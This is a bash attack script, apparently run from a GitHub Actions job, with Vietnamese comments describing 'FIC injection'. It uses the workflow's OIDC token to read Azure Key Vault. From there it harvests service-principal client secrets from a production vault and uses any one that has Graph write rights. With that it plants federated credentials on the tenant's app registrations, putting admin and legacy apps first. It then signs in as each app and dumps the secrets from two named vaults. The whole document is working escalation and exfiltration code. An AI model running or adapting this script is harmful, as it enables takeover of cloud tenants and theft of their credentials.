#!/usr/bin/env bash
# v6 — Graph FIC injection: thêm federated credential trỏ về OIDC GitHub cho các app
#      (đặc biệt tbl-legacy-admin) rồi đăng nhập thành app đó -> kv-tbl-sec-x3euoz
set +e
TEN="${AZURE_TENANT_ID}"
SUB="${AZURE_SUBSCRIPTION_ID}"
SEC=kv-tbl-sec-x3euoz
PROD=kv-tbl-prod-x3euoz
RG=rg-tbl-platform-prod-sea
TAG="htx$RANDOM"

gh_tok(){ curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$1" \
  | python3 -c "import sys,json;print(json.load(sys.stdin)['value'])"; }
tok_fed(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=${AZURE_CLIENT_ID}" -d "scope=$1" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
tok_sp(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  --data-urlencode "client_secret=$2" \
  | python3 -c "import sys,json;print(json.load(sys.stdin).get('access_token',''))"; }
# đăng nhập thành app $1 bằng assertion OIDC GitHub $2
tok_as_app(){ curl -sS -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  -d "client_id=$1" -d "scope=$3" -d grant_type=client_credentials \
  -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$2"; }

GHTOK=$(gh_tok "api://AzureADTokenExchange")
SUBJ=$(echo "$GHTOK" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null \
      | python3 -c "import sys,json;print(json.load(sys.stdin)['sub'])")
echo "[*] OIDC sub = $SUBJ"

KV=$(tok_fed "https://vault.azure.net/.default" "$GHTOK")

# --- lấy secret SP từ kv-tbl-prod để có directory-audit-principal
curl -sS -H "Authorization: Bearer $KV" "https://$PROD.vault.azure.net/secrets?api-version=7.4" > /tmp/l.json
: > /tmp/sps.txt
for ID in $(python3 -c "
import json;print('\n'.join(s['id'] for s in json.load(open('/tmp/l.json')).get('value',[])))"); do
  curl -sS -H "Authorization: Bearer $KV" "$ID?api-version=7.4" > /tmp/s.json
  python3 - "${ID##*/}" <<'PY' >> /tmp/sps.txt
import json,sys
try:
    v=json.loads(json.load(open("/tmp/s.json"))["value"])
    print(sys.argv[1], v.get("appId",""), v.get("clientSecret",""))
except Exception: pass
PY
done

# --- token Graph có quyền ghi (thử lần lượt)
G=""
while read -r NAME APPID SECRET; do
  [ -z "$APPID" ] && continue
  T=$(tok_sp "$APPID" "$SECRET" "https://graph.microsoft.com/.default")
  [ -z "$T" ] && continue
  if curl -sS -H "Authorization: Bearer $T" \
      "https://graph.microsoft.com/v1.0/applications?\$top=1" | grep -q '"value"'; then
    echo "[*] graph via $NAME"; G="$T"; break
  fi
done < /tmp/sps.txt
[ -z "$G" ] && { echo "không có token Graph"; exit 0; }

curl -sS -H "Authorization: Bearer $G" \
  "https://graph.microsoft.com/v1.0/applications?\$top=100&\$select=id,appId,displayName" > /tmp/apps.json
python3 -c "
import json
for a in json.load(open('/tmp/apps.json'))['value']: print(a['id'],a['appId'],a['displayName'])" > /tmp/apps.txt
echo '=== APPS ==='; cat /tmp/apps.txt

# ưu tiên legacy-admin / directory-sync trước
ORDER=$( (grep -iE 'legacy|admin|directory|sync|insights' /tmp/apps.txt; cat /tmp/apps.txt) | awk '!seen[$1]++')

echo "$ORDER" | while read -r OID APPID NAME; do
  [ -z "$OID" ] && continue
  [ "$APPID" = "$AZURE_CLIENT_ID" ] && continue
  echo "================ $NAME ($APPID) ================"
  BODY=$(python3 -c "
import json,sys
print(json.dumps({'name':'fic-'+sys.argv[1],
 'issuer':'https://token.actions.githubusercontent.com',
 'subject':sys.argv[2],'audiences':['api://AzureADTokenExchange']}))" "$TAG" "$SUBJ")
  R=$(curl -sS -X POST -H "Authorization: Bearer $G" -H 'Content-Type: application/json' \
      -d "$BODY" "https://graph.microsoft.com/v1.0/applications/$OID/federatedIdentityCredentials")
  if echo "$R" | grep -q '"error"'; then echo "  FIC fail: $(echo "$R" | head -c 200)"; continue; fi
  echo "  FIC added"
  sleep 6
  for SCOPE in "https://vault.azure.net/.default" "https://management.azure.com/.default"; do
    AT=$(tok_as_app "$APPID" "$GHTOK" "$SCOPE" | python3 -c "
import sys,json
d=json.load(sys.stdin); print(d.get('access_token','') or ('ERR:'+str(d.get('error_description',''))[:90]))")
    case "$AT" in ERR:*) echo "  $SCOPE -> $AT"; continue;; "") continue;; esac
    echo "  token OK cho $SCOPE"
    if [ "$SCOPE" = "https://vault.azure.net/.default" ]; then
      for V in "$SEC" "$PROD"; do
        L=$(curl -sS -H "Authorization: Bearer $AT" "https://$V.vault.azure.net/secrets?api-version=7.4")
        echo "$L" | grep -q '"error"' && { echo "    $V: denied"; continue; }
        echo "    $V: OK"
        for SID in $(echo "$L" | python3 -c "
import sys,json
for s in json.load(sys.stdin).get('value',[]): print(s['id'])"); do
          echo "    --- $SID"
          curl -sS -H "Authorization: Bearer $AT" "$SID?api-version=7.4" | head -c 1200; echo
        done
      done
    fi
  done
done
echo "================ DONE ================"
